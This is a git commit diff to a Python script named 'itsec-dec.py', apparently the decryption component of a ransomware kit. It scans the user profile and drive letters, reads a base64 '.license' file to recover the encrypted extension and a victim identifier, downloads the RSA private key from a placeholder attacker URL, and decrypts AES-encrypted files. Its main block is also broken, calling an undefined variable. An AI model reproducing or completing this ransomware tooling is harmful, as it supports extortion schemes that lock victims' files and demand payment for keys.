86d6d168ece6021d7e2321b9ac2f9d4e86fa0728
shinau21 <bandingandesa@gmail.com>
2023-03-26 13:38:03 +0700

    Decrypt With URL Source

--- itsec-dec.py
+++ itsec-dec.py
@@ -1,13 +1,36 @@
 import os
-from time import sleep
-from cryptography.fernet import Fernet as xf
+import base64
+import requests as req
+from sys import platform
 from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Cipher import AES, PKCS1_OAEP
 
-pvk = '''YOUR PRIVATE KEY'''
+def gext(filename):
+    with open(filename,'r') as license:
+        ler = license.read()
+        len = base64.b64decode(ler.encode('utf-8'))
+        l = len.decode('utf-8')
+    ext = '.' + l.split('.')[1]
+    return ext
 
-def decrypt(filename):
+def gl(filename):
+    # On Website
+    try:
+        url_web = "Your URL"
+        with open(filename,'r') as license:
+            ler = license.read()
+            len = base64.b64decode(ler.encode('utf-8'))
+            lsp = len.decode('utf-8').split('.')[0]
+            lenc = base64.b64encode(lsp.encode('utf-8'))
+            l = lenc.decode('utf-8')
+        URL_KEY = url_web + l + '.pem'
+        pvk = req.get(URL_KEY).text
+        return pvk
+    except:
+        print("Please use internet connection")
+
+def decrypt(filename,pvk):
     with open(filename, "rb") as file:
         private_key = RSA.import_key(pvk)
         enc_session_key, nonce, tag, ciphertext = [ file.read(x) for x in (private_key.size_in_bytes(), 16, 16, -1) ]
@@ -25,9 +48,11 @@ def decrypt(filename):
 def defense(target):
     for p, d, f in os.walk(target):
         for name in f:
-            if name.endswith((".itsec")):
+            ext = gext(os.path.join(p,'.license'))
+            pvk = gl(os.path.join(p,'.license'))
+            if name.endswith((ext)):
                 try:
-                    decrypt(os.path.join(p, name))
+                    decrypt(os.path.join(p, name),pvk)
                     newFile = os.path.splitext(name)[0]
                     os.rename(os.path.join(p, name), os.path.join(p,newFile))
                 except:
@@ -38,5 +63,13 @@ def defense(target):
                     status = "All Files has been Decrypted"
 
 if __name__ == '__main__':
-    t0 = os.environ["USERPROFILE"]
-    defense(t0)
+    if (platform == 'win32'):
+        t = [os.environ["USERPROFILE"],"A:","B:","D:","E:","F:","G:","H:","I:","J:","K:","L:","M:","N:"]
+        for i in range(len(t)):
+            defense(t0)
+    elif (platform == 'linux'):
+        t = ['~']
+        for i in range(len(t)):
+            defense(t0)
+    else:
+        print('I will better')
